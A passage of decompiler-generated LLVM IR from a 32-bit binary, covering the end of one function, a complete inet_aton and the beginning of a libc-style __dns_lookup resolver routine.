  %v0_805645b32 = phi i32 [ %v4_805644a, %dec_label_pc_8056462.lr.ph ], [ %v1_805645b, %dec_label_pc_805645b ]
  store i32 %arg2, i32* @edx, align 4
  %v2_805645515 = load i8, i8* %v1_805645514, align 1
  %v3_805645516 = zext i8 %v2_805645515 to i32
  %v5_805645517 = and i32 %v4_8056455.pre, -256
  %v6_805645518 = or i32 %v3_805645516, %v5_805645517
  store i32 %v6_805645518, i32* @ecx, align 4
  %v4_805645719 = icmp eq i8 %v2_805645515, 0
  %v1_805645921 = icmp eq i1 %v4_805645719, false
  br i1 %v1_805645921, label %dec_label_pc_8056450, label %dec_label_pc_805645b

dec_label_pc_8056466:                             ; preds = %dec_label_pc_805645b, %entry
  br label %dec_label_pc_8056468

dec_label_pc_8056468:                             ; preds = %dec_label_pc_8056450, %dec_label_pc_8056466
  %v0_805646a = phi i32 [ 0, %dec_label_pc_8056466 ], [ %v0_805645b32, %dec_label_pc_8056450 ]
  store i32 %v0_8056445, i32* @ebx, align 4
  ret i32 %v0_805646a

; uselistorder directives
  uselistorder i32 %v6_805645518, { 2, 0, 1 }
  uselistorder i8 %v2_805645515, { 1, 2, 0 }
  uselistorder i32 %v1_805645b, { 1, 0 }
  uselistorder i32 %v6_8056455, { 1, 2, 0 }
  uselistorder i8 %v2_8056455, { 1, 2, 0 }
  uselistorder i32 %v1_8056454, { 2, 1, 0 }
  uselistorder i8 %v2_805645c26, { 0, 2, 1 }
  uselistorder i32 %v0_8056445, { 1, 0 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8056468, { 1, 0 }
  uselistorder label %dec_label_pc_8056462, { 1, 0 }
  uselistorder label %dec_label_pc_805645b, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_8056473 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8056473, i32* @ecx, align 4
  %v1_8056477 = icmp eq i8* %arg1, null
  br i1 %v1_8056477, label %dec_label_pc_80564f8, label %dec_label_pc_805647b

dec_label_pc_805647b:                             ; preds = %entry
  %v0_8056486.pre = load i32, i32* @global_var_805c278, align 8
  br label %dec_label_pc_8056486

dec_label_pc_8056486:                             ; preds = %dec_label_pc_805647b, %dec_label_pc_80564cf
  %v2_80564cf34 = phi i32 [ 1, %dec_label_pc_805647b ], [ %v3_80564cf, %dec_label_pc_80564cf ]
  %v0_805648c33 = phi i32 [ %v4_8056473, %dec_label_pc_805647b ], [ %v0_805648c3, %dec_label_pc_80564cf ]
  %v0_80564ed32 = phi i32 [ 0, %dec_label_pc_805647b ], [ %v2_80564d5, %dec_label_pc_80564cf ]
  %v1_805648c = inttoptr i32 %v0_805648c33 to i8*
  %v2_805648c = load i8, i8* %v1_805648c, align 1
  %v3_805648c = sext i8 %v2_805648c to i32
  %v2_805648f = mul nsw i32 %v3_805648c, 2
  %v3_805648f = add i32 %v2_805648f, %v0_8056486.pre
  %v4_805648f = inttoptr i32 %v3_805648f to i8*
  %v5_805648f = load i8, i8* %v4_805648f, align 1
  %v6_805648f = and i8 %v5_805648f, 8
  %v7_805648f = icmp eq i8 %v6_805648f, 0
  br i1 %v7_805648f, label %dec_label_pc_80564f8, label %dec_label_pc_8056496

dec_label_pc_8056496:                             ; preds = %dec_label_pc_8056486
  %v4_80564aa.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80564aa

dec_label_pc_805649a:                             ; preds = %dec_label_pc_80564aa
  %v3_805649a = mul i32 %v1_805649a, 10
  %v2_805649d = add i32 %v3_805649a, -48
  %v3_805649d = add i32 %v2_805649d, %v2_80564ac
  %v1_80564a1 = add i32 %v3_805649d, -255
  %v6_80564a1 = sub i32 254, %v3_805649d
  %v7_80564a1 = and i32 %v6_80564a1, %v3_805649d
  %v8_80564a1 = icmp slt i32 %v7_80564a1, 0
  %v9_80564a1 = icmp eq i32 %v1_80564a1, 0
  %v10_80564a1 = icmp slt i32 %v1_80564a1, 0
  %v3_80564a7 = icmp eq i1 %v10_80564a1, %v8_80564a1
  %v4_80564a7 = icmp eq i1 %v9_80564a1, false
  %v5_80564a7 = and i1 %v4_80564a7, %v3_80564a7
  br i1 %v5_80564a7, label %dec_label_pc_80564f8, label %dec_label_pc_80564a9

dec_label_pc_80564a9:                             ; preds = %dec_label_pc_805649a
  %v1_80564a9 = add i32 %v0_80564a9, 1
  store i32 %v1_80564a9, i32* @ecx, align 4
  br label %dec_label_pc_80564aa

dec_label_pc_80564aa:                             ; preds = %dec_label_pc_8056496, %dec_label_pc_80564a9
  %v1_805649a = phi i32 [ 0, %dec_label_pc_8056496 ], [ %v3_805649d, %dec_label_pc_80564a9 ]
  %v4_80564aa = phi i32 [ %v4_80564aa.pre, %dec_label_pc_8056496 ], [ %v6_80564aa, %dec_label_pc_80564a9 ]
  %v0_80564a9 = phi i32 [ %v0_805648c33, %dec_label_pc_8056496 ], [ %v1_80564a9, %dec_label_pc_80564a9 ]
  %v1_80564aa = inttoptr i32 %v0_80564a9 to i8*
  %v2_80564aa = load i8, i8* %v1_80564aa, align 1
  %v3_80564aa = zext i8 %v2_80564aa to i32
  %v5_80564aa = and i32 %v4_80564aa, -256
  %v6_80564aa = or i32 %v3_80564aa, %v5_80564aa
  store i32 %v6_80564aa, i32* @edx, align 4
  %v2_80564ac = sext i8 %v2_80564aa to i32
  %v2_80564af = mul nsw i32 %v2_80564ac, 2
  %v3_80564af = add i32 %v2_80564af, %v0_8056486.pre
  %v4_80564af = inttoptr i32 %v3_80564af to i16*
  %v5_80564af = load i16, i16* %v4_80564af, align 2
  %v2_80564b4 = and i16 %v5_80564af, 8
  %v3_80564b4 = icmp eq i16 %v2_80564b4, 0
  %v1_80564b6 = icmp eq i1 %v3_80564b4, false
  br i1 %v1_80564b6, label %dec_label_pc_805649a, label %dec_label_pc_80564b8

dec_label_pc_80564b8:                             ; preds = %dec_label_pc_80564aa
  %v8_80564b8 = sub nsw i32 2, %v2_80564cf34
  %v9_80564b8 = and i32 %v8_80564b8, %v2_80564cf34
  %v10_80564b8 = icmp slt i32 %v9_80564b8, 0
  %v11_80564b8 = icmp eq i32 %v2_80564cf34, 3
  %v12_80564b8 = icmp slt i32 %v2_80564cf34, 3
  %v3_80564bc = icmp eq i1 %v12_80564b8, %v10_80564b8
  %v4_80564bc = icmp eq i1 %v11_80564b8, false
  %v5_80564bc = and i1 %v4_80564bc, %v3_80564bc
  br i1 %v5_80564bc, label %dec_label_pc_80564c6, label %dec_label_pc_80564be

dec_label_pc_80564be:                             ; preds = %dec_label_pc_80564b8
  %v10_80564be = icmp eq i8 %v2_80564aa, 46
  %v1_80564c1 = icmp eq i1 %v10_80564be, false
  br i1 %v1_80564c1, label %dec_label_pc_80564f8, label %dec_label_pc_80564c3

dec_label_pc_80564c3:                             ; preds = %dec_label_pc_80564be
  %v1_80564c3 = add i32 %v0_80564a9, 1
  store i32 %v1_80564c3, i32* @ecx, align 4
  br label %dec_label_pc_80564cf

dec_label_pc_80564c6:                             ; preds = %dec_label_pc_80564b8
  %v1_80564c6 = add i32 %v0_80564a9, 1
  store i32 %v1_80564c6, i32* @ecx, align 4
  %v4_80564c7 = icmp eq i8 %v2_80564aa, 0
  br i1 %v4_80564c7, label %dec_label_pc_80564cf, label %dec_label_pc_80564cb

dec_label_pc_80564cb:                             ; preds = %dec_label_pc_80564c6
  %v2_80564cb = and i16 %v5_80564af, 32
  %v3_80564cb = icmp eq i16 %v2_80564cb, 0
  br i1 %v3_80564cb, label %dec_label_pc_80564f8, label %dec_label_pc_80564cf

dec_label_pc_80564cf:                             ; preds = %dec_label_pc_80564cb, %dec_label_pc_80564c6, %dec_label_pc_80564c3
  %v0_805648c3 = phi i32 [ %v1_80564c6, %dec_label_pc_80564cb ], [ %v1_80564c6, %dec_label_pc_80564c6 ], [ %v1_80564c3, %dec_label_pc_80564c3 ]
  %v3_80564cf = add nuw nsw i32 %v2_80564cf34, 1
  %v2_80564d2 = mul i32 %v0_80564ed32, 256
  %v2_80564d5 = or i32 %v1_805649a, %v2_80564d2
  %v7_80564db = icmp sgt i32 %v2_80564cf34, 3
  br i1 %v7_80564db, label %dec_label_pc_80564dd, label %dec_label_pc_8056486

dec_label_pc_80564dd:                             ; preds = %dec_label_pc_80564cf
  %v4_80564dd = icmp eq i32 %arg2, 0
  br i1 %v4_80564dd, label %dec_label_pc_80564fa, label %dec_label_pc_80564e9

dec_label_pc_80564e9:                             ; preds = %dec_label_pc_80564dd
  %v1_80564ed = call i32 @llvm.bswap.i32(i32 %v2_80564d5)
  %v2_80564ef = inttoptr i32 %arg2 to i32*
  store i32 %v1_80564ed, i32* %v2_80564ef, align 4
  br label %dec_label_pc_80564fa

dec_label_pc_80564f8:                             ; preds = %dec_label_pc_80564cb, %dec_label_pc_80564be, %dec_label_pc_8056486, %dec_label_pc_805649a, %entry
  br label %dec_label_pc_80564fa

dec_label_pc_80564fa:                             ; preds = %dec_label_pc_80564dd, %dec_label_pc_80564e9, %dec_label_pc_80564f8
  %v0_80564ff = phi i32 [ 1, %dec_label_pc_80564dd ], [ 1, %dec_label_pc_80564e9 ], [ 0, %dec_label_pc_80564f8 ]
  ret i32 %v0_80564ff

; uselistorder directives
  uselistorder i32 %v2_80564ac, { 1, 0 }
  uselistorder i32 %v6_80564aa, { 1, 0 }
  uselistorder i8 %v2_80564aa, { 1, 0, 2, 3 }
  uselistorder i32 %v0_80564a9, { 0, 1, 3, 2 }
  uselistorder i32 %v1_80564a1, { 1, 0 }
  uselistorder i32 %v3_805649d, { 1, 0, 3, 2 }
  uselistorder i32 %v0_805648c33, { 1, 0 }
  uselistorder i32 %v2_80564cf34, { 1, 4, 2, 0, 5, 3 }
  uselistorder i32 (i32)* @llvm.bswap.i32, { 3, 2, 1, 0 }
  uselistorder i32 -255, { 4, 0, 1, 2, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80564fa, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80564f8, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_80564aa, { 1, 0 }
  uselistorder label %dec_label_pc_8056486, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp33 = sext i32 %arg2 to i64
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %stack_var_-252 = alloca i8*, align 4
  store i32 %arg3, i32* @edi, align 4
  store i8* inttoptr (i32 512 to i8*), i8** %stack_var_-252, align 4
  %v2_8056516 = call i32 @malloc(i32 512)
  store i32 %v2_8056516, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 1025 to i8*), i8** %stack_var_-252, align 4
  store i32 %v2_8056516, i32* @ebp, align 4
  %v2_8056524 = call i32 @malloc(i32 1025)
  store i32 %v2_8056524, i32* %eax.global-to-local, align 4
  %v12_805652d = ptrtoint i32* %stack_var_-236 to i32
  %v1_8056530 = icmp eq i32 %v2_8056516, 0
  br i1 %v1_8056530, label %dec_label_pc_8056ba9, label %dec_label_pc_8056538

dec_label_pc_8056538:                             ; preds = %entry
  %v1_8056538 = icmp eq i32 %v2_8056524, 0
  br i1 %v1_8056538, label %dec_label_pc_8056ba9, label %dec_label_pc_8056540

dec_label_pc_8056540:                             ; preds = %dec_label_pc_8056538
  %v5_8056540 = icmp eq i32 %arg2, 0
  br i1 %v5_8056540, label %dec_label_pc_8056ba9, label %dec_label_pc_805654e

dec_label_pc_805654e:                             ; preds = %dec_label_pc_8056540
  %v4_805654e = ptrtoint i8* %arg1 to i32
  store i32 %v4_805654e, i32* %eax.global-to-local, align 4
  %v2_8056555 = load i8, i8* %arg1, align 1
  %v3_8056555 = icmp eq i8 %v2_8056555, 0
  br i1 %v3_8056555, label %dec_label_pc_8056ba9, label %dec_label_pc_805655e

dec_label_pc_805655e:                             ; preds = %dec_label_pc_805654e
  store i8* %arg1, i8** %stack_var_-252, align 4
  %v3_8056562 = call i32 @strlen(i8* nonnull %arg1)
  store i32 %v3_8056562, i32* @eax, align 4
  store i32 %v4_805654e, i32* %edx.global-to-local, align 4
  %v2_8056585 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_8056585, i32* @ebx, align 4
  %tmp46 = bitcast i32* %stack_var_-52 to i8*
  store i8* %tmp46, i8** %stack_var_-252, align 4
  %v3_805658d = call i32 @__pthread_return_void(i32 %v2_8056585, i32 134566343)
  store i32 %v3_805658d, i32* %eax.global-to-local, align 4
  store i8* bitcast (i8** @global_var_8062788.558 to i8*), i8** %stack_var_-252, align 4
  %v2_8056599 = call i32 @__pthread_return_0(i32 ptrtoint (i8** @global_var_8062788.558 to i32))
  %v0_805659e = load i64, i64* @global_var_80627a0.559, align 8
  %v1_805659e = trunc i64 %v0_805659e to i32
  %v1_80565a3 = ashr i32 %v1_805659e, 31
  %v6_80565a4 = and i64 %v0_805659e, 4294967295
  %v8_80565a4 = zext i32 %v1_80565a3 to i64
  %v9_80565a4 = mul nuw i64 %v8_80565a4, 4294967296
  %v10_80565a4 = or i64 %v9_80565a4, %v6_80565a4
  %v14_80565a4 = srem i64 %v10_80565a4, %tmp33
  %v15_80565a4 = trunc i64 %v14_80565a4 to i32
  %v0_80565ab = load i16, i16* @global_var_805c4e4.560, align 4
  %v2_80565ba = load i8*, i8** %stack_var_-252, align 4
  %v3_80565ba = ptrtoint i8* %v2_80565ba to i32
  store i32 %v3_80565ba, i32* @eax, align 4
  store i32 134566343, i32* %edx.global-to-local, align 4
  store i8* %tmp46, i8** %stack_var_-252, align 4
  %v3_80565bf = call i32 @__pthread_return_void(i32 %v2_8056585, i32 1)
  store i32 %v3_80565bf, i32* %eax.global-to-local, align 4
  %v4_8056766 = inttoptr i32 %v15_80565a4 to i8*
  %v1_8056b8472 = add i32 %v12_805652d, 28
  %v2_8056b8473 = inttoptr i32 %v1_8056b8472 to i32*
  %v3_8056b8474 = load i32, i32* %v2_8056b8473, align 4
  %tmp = icmp ult i32 %v3_8056b8474, 3
  br i1 %tmp, label %dec_label_pc_80565e4, label %dec_label_pc_8056ba9

dec_label_pc_80565e4:                             ; preds = %dec_label_pc_805655e, %dec_label_pc_8056b84.backedge
  %v0_80565eb83 = phi i32 [ %v0_8056b84.pre, %dec_label_pc_8056b84.backedge ], [ %v12_805652d, %dec_label_pc_805655e ]
  %v1_80565e4 = add i32 %v0_80565eb83, 20
  %v2_80565e4 = inttoptr i32 %v1_80565e4 to i32*
  %v3_80565e4 = load i32, i32* %v2_80565e4, align 4
  %v13_80565e4 = icmp eq i32 %v3_80565e4, -1
  br i1 %v13_80565e4, label %dec_label_pc_80565e4.dec_label_pc_80565fa_crit_edge, label %dec_label_pc_80565eb

dec_label_pc_80565e4.dec_label_pc_80565fa_crit_edge: ; preds = %dec_label_pc_80565e4
  %v0_80565fa.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80565fa

dec_label_pc_80565eb:                             ; preds = %dec_label_pc_80565e4
  %v3_80565ee = load i32, i32* %v2_80565e4, align 4
  %v5_80565ee = add i32 %v0_80565eb83, -16
  %v6_80565ee = inttoptr i32 %v5_80565ee to i32*
  store i32 %v3_80565ee, i32* %v6_80565ee, align 4
  %v1_80565f2 = call i32 @__libc_close(i32 -1)
  store i32 %v1_80565f2, i32* %eax.global-to-local, align 4
  %v0_80565f7 = load i32, i32* @esp, align 4
  %v1_80565f7 = add i32 %v0_80565f7, 16
  br label %dec_label_pc_80565fa

dec_label_pc_80565fa:                             ; preds = %dec_label_pc_80565e4.dec_label_pc_80565fa_crit_edge, %dec_label_pc_80565eb
  %v1_80565fa = phi i32 [ %v0_80565eb83, %dec_label_pc_80565e4.dec_label_pc_80565fa_crit_edge ], [ %v1_80565f7, %dec_label_pc_80565eb ]
  %v0_80565fa = phi i32 [ %v0_80565fa.pre, %dec_label_pc_80565e4.dec_label_pc_80565fa_crit_edge ], [ %v1_80565f2, %dec_label_pc_80565eb ]
  %v2_80565fa = add i32 %v1_80565fa, -4
  %v3_80565fa = inttoptr i32 %v2_80565fa to i32*
  store i32 %v0_80565fa, i32* %v3_80565fa, align 4
  %v1_80565fb = add i32 %v1_80565fa, -8
  %v2_80565fb = inttoptr i32 %v1_80565fb to i32*
  store i32 512, i32* %v2_80565fb, align 4
  %v1_8056600 = add i32 %v1_80565fa, -12
  %v2_8056600 = inttoptr i32 %v1_8056600 to i32*
  store i32 0, i32* %v2_8056600, align 4
  %v2_8056602 = add i32 %v1_80565fa, -16
  %v3_8056602 = inttoptr i32 %v2_8056602 to i32*
  store i32 %v2_8056516, i32* %v3_8056602, align 4
  %v4_8056603 = call i32 @__GI_memset(i8* inttoptr (i32 -1 to i8*), i32 %v15_80565a4, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8056603, i32* %eax.global-to-local, align 4
  %v0_8056608 = load i32, i32* @esp, align 4
  %v1_805660b = add i32 %v0_8056608, 8
  %v2_805660b = inttoptr i32 %v1_805660b to i32*
  store i32 48, i32* %v2_805660b, align 4
  %v1_805660d = add i32 %v0_8056608, 4
  %v2_805660d = inttoptr i32 %v1_805660d to i32*
  store i32 0, i32* %v2_805660d, align 4
  %v1_805660f = add i32 %v0_8056608, 84
  store i32 %v1_805660f, i32* @ebx, align 4
  %v3_8056613 = inttoptr i32 %v0_8056608 to i32*
  store i32 %v1_805660f, i32* %v3_8056613, align 4
  %v4_8056614 = call i32 @__GI_memset(i8* inttoptr (i32 -1 to i8*), i32 %v15_80565a4, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8056614, i32* %eax.global-to-local, align 4
  %v0_8056619 = load i32, i32* @esp, align 4
  %v1_8056619 = add i32 %v0_8056619, 72
  %v2_8056619 = inttoptr i32 %v1_8056619 to i32*
  %v3_8056619 = load i32, i32* %v2_8056619, align 4
  store i32 %v3_8056619, i32* %eax.global-to-local, align 4
  %v1_805661d = add i32 %v0_8056619, 116
  %v2_805661d = inttoptr i32 %v1_805661d to i32*
  store i32 1, i32* %v2_805661d, align 4
  %v0_8056625 = load i32, i32* @esp, align 4
  %v1_8056625 = add i32 %v0_8056625, 104
  %v2_8056625 = inttoptr i32 %v1_8056625 to i32*
  store i32 1, i32* %v2_8056625, align 4
  %v0_805662d = load i32, i32* %eax.global-to-local, align 4
  %v1_805662d = add i32 %v0_805662d, 1
  %v1_805662e = urem i32 %v1_805662d, 65536
  store i32 %v1_805662e, i32* %eax.global-to-local, align 4
  %v1_8056633 = load i32, i32* @esp, align 4
  %v2_8056633 = add i32 %v1_8056633, 72
  %v3_8056633 = inttoptr i32 %v2_8056633 to i32*
  store i32 %v1_805662e, i32* %v3_8056633, align 4
  %v0_8056637 = load i32, i32* %eax.global-to-local, align 4
  %v1_8056637 = load i32, i32* @esp, align 4
  %v2_8056637 = add i32 %v1_8056637, 84
  %v3_8056637 = inttoptr i32 %v2_8056637 to i32*
  store i32 %v0_8056637, i32* %v3_8056637, align 4
  %v0_805663b = load i32, i32* @esp, align 4
  %v1_805663e = add i32 %v0_805663b, 8
  %v2_805663e = inttoptr i32 %v1_805663e to i32*
  store i32 512, i32* %v2_805663e, align 4
  %v2_8056643 = add i32 %v0_805663b, 4
  %v3_8056643 = inttoptr i32 %v2_8056643 to i32*
  store i32 %v2_8056516, i32* %v3_8056643, align 4
  %v0_8056644 = load i32, i32* @ebx, align 4
  %v3_8056644 = inttoptr i32 %v0_805663b to i32*
  store i32 %v0_8056644, i32* %v3_8056644, align 4
  %v0_8056645 = call i32 @__encode_header()
  store i32 %v0_8056645, i32* %eax.global-to-local, align 4
  %v0_805664a = load i32, i32* @esp, align 4
  %v2_805664d = icmp slt i32 %v0_8056645, 0
  store i32 %v0_8056645, i32* @ebx, align 4
  br i1 %v2_805664d, label %dec_label_pc_8056ba9, label %dec_label_pc_8056657

dec_label_pc_8056657:                             ; preds = %dec_label_pc_80565fa
  %v2_8056657 = add i32 %v0_805664a, 12
  %v3_8056657 = inttoptr i32 %v2_8056657 to i32*
  store i32 %v0_8056645, i32* %v3_8056657, align 4
  %v1_8056658 = add i32 %v0_805664a, 8
  %v2_8056658 = inttoptr i32 %v1_8056658 to i32*
  store i32 1025, i32* %v2_8056658, align 4
  %v1_805665d = add i32 %v0_805664a, 256
  %v2_805665d = inttoptr i32 %v1_805665d to i32*
  %v3_805665d = load i32, i32* %v2_805665d, align 4
  %v5_805665d = add i32 %v0_805664a, 4
  %v6_805665d = inttoptr i32 %v5_805665d to i32*
  store i32 %v3_805665d, i32* %v6_805665d, align 4
  %v1_8056664 = add i32 %v0_805664a, 28
  %v2_8056664 = inttoptr i32 %v1_8056664 to i32*
  %v3_8056664 = load i32, i32* %v2_8056664, align 4
  %v6_8056664 = inttoptr i32 %v0_805664a to i32*
  store i32 %v3_8056664, i32* %v6_8056664, align 4
  %v4_8056668 = call i32 @strncpy(i8* inttoptr (i32 -1 to i8*), i32 %v15_80565a4, i32 ptrtoint (i32* @0 to i32))
  %v0_805666d = load i32, i32* @esp, align 4
  %v1_8056670 = add i32 %v0_805666d, 8
  %v2_8056670 = inttoptr i32 %v1_8056670 to i32*
  store i32 ptrtoint (i32* @global_var_805c4e8.497 to i32), i32* %v2_8056670, align 4
  %v1_8056675 = add i32 %v0_805666d, 4
  %v2_8056675 = inttoptr i32 %v1_8056675 to i32*
  store i32 134566343, i32* %v2_8056675, align 4
  %v1_805667a = add i32 %v0_805666d, 200
  store i32 %v1_805667a, i32* @eax, align 4
  %v3_8056681 = inttoptr i32 %v0_805666d to i32*
  store i32 %v1_805667a, i32* %v3_8056681, align 4
  %v2_8056682 = call i32 @__pthread_return_void(i32 -1, i32 %v15_80565a4)
  store i32 %v2_8056682, i32* %eax.global-to-local, align 4
  %v0_8056687 = load i32, i32* @esp, align 4
  %v1_8056687 = inttoptr i32 %v0_8056687 to i32*
  store i32 ptrtoint (i32* @global_var_805c4e8.497 to i32), i32* %v1_8056687, align 4
  %v1_805668e = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_805668e, i32* %eax.global-to-local, align 4
  %v0_8056693 = load i32, i32* @esp, align 4
  %v1_8056693 = add i32 %v0_8056693, 56
  %v2_8056693 = inttoptr i32 %v1_8056693 to i32*
  %v3_8056693 = load i32, i32* %v2_8056693, align 4
  store i32 %v3_8056693, i32* %edx.global-to-local, align 4
  %v1_8056697 = add i32 %v0_8056693, 268
  %v2_8056697 = inttoptr i32 %v1_8056697 to i32*
  %v3_8056697 = load i32, i32* %v2_8056697, align 4
  store i32 %v3_8056697, i32* %eax.global-to-local, align 4
  %v2_805669e = mul i32 %v3_8056693, 4
  %v3_805669e = add i32 %v3_8056697, %v2_805669e
  %v4_805669e = inttoptr i32 %v3_805669e to i32*
  %v5_805669e = load i32, i32* %v4_805669e, align 4
  store i32 %v5_805669e, i32* %edx.global-to-local, align 4
  %v2_80566a1 = add i32 %v0_8056693, 48
  %v3_80566a1 = inttoptr i32 %v2_80566a1 to i32*
  store i32 %v5_805669e, i32* %v3_80566a1, align 4
  %v0_80566a5 = load i32, i32* @esp, align 4
  %v1_80566a5 = add i32 %v0_80566a5, 16
  %v1_80566a8 = add i32 %v0_80566a5, 52
  %v2_80566a8 = inttoptr i32 %v1_80566a8 to i32*
  %v3_80566a8 = load i32, i32* %v2_80566a8, align 4
  %v5_80566a8 = icmp slt i32 %v3_80566a8, 0
  br i1 %v5_80566a8, label %dec_label_pc_8056657.dec_label_pc_80566ee_crit_edge, label %dec_label_pc_80566af

dec_label_pc_8056657.dec_label_pc_80566ee_crit_edge: ; preds = %dec_label_pc_8056657
  %v0_80566ee.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80566ee

dec_label_pc_80566af:                             ; preds = %dec_label_pc_8056657
  store i32 %v3_80566a8, i32* %eax.global-to-local, align 4
  %v1_80566b3 = load i32, i32* @global_var_8062bd8.561, align 8
  %v2_80566b3 = sub i32 %v3_80566a8, %v1_80566b3
  %v8_80566b3 = xor i32 %v1_80566b3, %v3_80566a8
  %v9_80566b3 = xor i32 %v2_80566b3, %v3_80566a8
  %v10_80566b3 = and i32 %v9_80566b3, %v8_80566b3
  %v11_80566b3 = icmp slt i32 %v10_80566b3, 0
  %v13_80566b3 = icmp slt i32 %v2_80566b3, 0
  %v2_80566b9 = icmp eq i1 %v13_80566b3, %v11_80566b3
  br i1 %v2_80566b9, label %dec_label_pc_80566ee, label %dec_label_pc_80566bb

dec_label_pc_80566bb:                             ; preds = %dec_label_pc_80566af
  %v2_80566bb = add i32 %v0_80566a5, 12
  %v3_80566bb = inttoptr i32 %v2_80566bb to i32*
  store i32 %v3_80566a8, i32* %v3_80566bb, align 4
  %v1_80566bc = add i32 %v0_80566a5, 8
  %v2_80566bc = inttoptr i32 %v1_80566bc to i32*
  store i32 1025, i32* %v2_80566bc, align 4
  %v1_80566c1 = add i32 %v0_80566a5, 4
  %v2_80566c1 = inttoptr i32 %v1_80566c1 to i32*
  store i32 ptrtoint (i32* @global_var_805b4dc.562 to i32), i32* %v2_80566c1, align 4
  %v1_80566c6 = add i32 %v0_80566a5, 28
  %v2_80566c6 = inttoptr i32 %v1_80566c6 to i32*
  %v3_80566c6 = load i32, i32* %v2_80566c6, align 4
  %v6_80566c6 = inttoptr i32 %v0_80566a5 to i32*
  store i32 %v3_80566c6, i32* %v6_80566c6, align 4
  %v0_80566ca = call i32 @__GI_strncat()
  store i32 %v0_80566ca, i32* %eax.global-to-local, align 4
  %v0_80566cf = load i32, i32* @esp, align 4
  %v1_80566d2 = add i32 %v0_80566cf, 8
  %v2_80566d2 = inttoptr i32 %v1_80566d2 to i32*
  store i32 1025, i32* %v2_80566d2, align 4
  %v1_80566d7 = add i32 %v0_80566cf, 52
  %v2_80566d7 = inttoptr i32 %v1_80566d7 to i32*
  %v3_80566d7 = load i32, i32* %v2_80566d7, align 4
  store i32 %v3_80566d7, i32* %edx.global-to-local, align 4
  %v1_80566db = mul i32 %v3_80566d7, 4
  %v2_80566db = add i32 %v1_80566db, 134622136
  %v3_80566db = inttoptr i32 %v2_80566db to i32*
  %v4_80566db = load i32, i32* %v3_80566db, align 4
  %v6_80566db = add i32 %v0_80566cf, 4
  %v7_80566db = inttoptr i32 %v6_80566db to i32*
  store i32 %v4_80566db, i32* %v7_80566db, align 4
  %v1_80566e2 = add i32 %v0_80566cf, 28
  %v2_80566e2 = inttoptr i32 %v1_80566e2 to i32*
  %v3_80566e2 = load i32, i32* %v2_80566e2, align 4
  %v6_80566e2 = inttoptr i32 %v0_80566cf to i32*
  store i32 %v3_80566e2, i32* %v6_80566e2, align 4
  %v0_80566e6 = call i32 @__GI_strncat()
  store i32 %v0_80566e6, i32* %eax.global-to-local, align 4
  %v0_80566eb = load i32, i32* @esp, align 4
  %v1_80566eb = add i32 %v0_80566eb, 16
  br label %dec_label_pc_80566ee

dec_label_pc_80566ee:                             ; preds = %dec_label_pc_8056657.dec_label_pc_80566ee_crit_edge, %dec_label_pc_80566af, %dec_label_pc_80566bb
  %v1_80566ee = phi i32 [ %v1_80566a5, %dec_label_pc_8056657.dec_label_pc_80566ee_crit_edge ], [ %v1_80566a5, %dec_label_pc_80566af ], [ %v1_80566eb, %dec_label_pc_80566bb ]
  %v0_80566ee = phi i32 [ %v0_80566ee.pre, %dec_label_pc_8056657.dec_label_pc_80566ee_crit_edge ], [ %v3_80566a8, %dec_label_pc_80566af ], [ %v0_80566e6, %dec_label_pc_80566bb ]
  %v2_80566ee = add i32 %v1_80566ee, -4
  %v3_80566ee = inttoptr i32 %v2_80566ee to i32*
  store i32 %v0_80566ee, i32* %v3_80566ee, align 4
  %v0_80566ef = load i32, i32* %eax.global-to-local, align 4
  %v2_80566ef = add i32 %v1_80566ee, -8
  %v3_80566ef = inttoptr i32 %v2_80566ef to i32*
  store i32 %v0_80566ef, i32* %v3_80566ef, align 4
  %v1_80566f0 = add i32 %v1_80566ee, -12
  %v2_80566f0 = inttoptr i32 %v1_80566f0 to i32*
  store i32 1, i32* %v2_80566f0, align 4
  %v1_80566f2 = add i32 %v1_80566ee, 184
  store i32 %v1_80566f2, i32* @eax, align 4
  %v2_80566f9 = add i32 %v1_80566ee, -16
  %v3_80566f9 = inttoptr i32 %v2_80566f9 to i32*
  store i32 %v1_80566f2, i32* %v3_80566f9, align 4
  %v2_80566fa = call i32 @__pthread_return_void(i32 -1, i32 %v15_80565a4)
  store i32 %v2_80566fa, i32* %eax.global-to-local, align 4
  %v0_80566ff = load i32, i32* @esp, align 4
  %v1_80566ff = add i32 %v0_80566ff, 28
  %v2_80566ff = inttoptr i32 %v1_80566ff to i32*
  %v3_80566ff = load i32, i32* %v2_80566ff, align 4
  store i32 %v3_80566ff, i32* %eax.global-to-local, align 4
  %v1_8056703 = add i32 %v0_80566ff, 260
  %v2_8056703 = inttoptr i32 %v1_8056703 to i32*
  %v3_8056703 = load i32, i32* %v2_8056703, align 4
  store i32 %v3_8056703, i32* @edx, align 4
  %v1_805670a = add i32 %v0_80566ff, 224
  %v2_805670a = inttoptr i32 %v1_805670a to i32*
  store i32 1, i32* %v2_805670a, align 4
  %v0_8056715 = load i32, i32* %eax.global-to-local, align 4
  %v1_8056715 = load i32, i32* @esp, align 4
  %v2_8056715 = add i32 %v1_8056715, 216
  %v3_8056715 = inttoptr i32 %v2_8056715 to i32*
  store i32 %v0_8056715, i32* %v3_8056715, align 4
  %v1_8056721 = load i32, i32* @ebx, align 4
